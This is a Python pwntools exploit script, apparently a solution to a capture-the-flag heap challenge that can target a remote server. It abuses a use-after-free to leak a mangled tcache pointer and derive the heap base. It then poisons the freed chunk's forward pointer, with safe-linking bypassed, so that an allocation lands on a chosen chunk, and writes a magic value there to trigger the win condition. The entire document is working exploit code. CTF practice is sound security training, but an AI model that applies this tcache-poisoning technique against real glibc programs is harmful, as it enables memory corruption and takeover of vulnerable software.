#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./chall')
context.log_level = 'debug'

libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote('chals1.apoorvctf.xyz', 6001)
    return process('./chall')

def menu(p, choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice).encode())

def new_order(p):
    menu(p, 1)

def cancel(p, idx):
    menu(p, 2)
    p.recvuntil(b'Slot: ')
    p.sendline(str(idx).encode())

def inspect(p, idx):
    menu(p, 3)
    p.recvuntil(b'Slot: ')
    p.sendline(str(idx).encode())

def modify(p, idx, data):
    menu(p, 4)
    p.recvuntil(b'Slot: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'filling: ')
    p.sendline(data)

def claim(p):
    menu(p, 5)

p = conn()

# Step 1: Alloc order 0 and 1
new_order(p)  # slot 0
new_order(p)  # slot 1

# Step 2: Free order 0
cancel(p, 0)

# Step 3: Leak heap
inspect(p, 0)
p.recvuntil(b"off.\"\n")
leak = p.recv(0x28)
mangled_fd = u64(leak[:8])
log.info(f"Mangled fd: {hex(mangled_fd)}")
heap_base = mangled_fd << 12
log.info(f"Heap base: {hex(heap_base)}")

chimichanga_addr = heap_base + 0x2a0
order1_addr = heap_base + 0x300

# Step 4: Free order 1
cancel(p, 1)

# Step 5: Poison order1's fd
mangled_target = chimichanga_addr ^ (order1_addr >> 12)
modify(p, 1, p64(mangled_target))

# Step 6: Alloc twice to get chimichanga chunk
new_order(p)  # slot 2 (gets order1)
new_order(p)  # slot 3 (gets chimichanga)

# Step 7: Write 0xcafebabe
modify(p, 3, p64(0xcafebabe))

# Step 8: Claim
claim(p)

# Receive everything
data = p.recvall(timeout=5)
print(data)
print(data.decode('latin-1'))
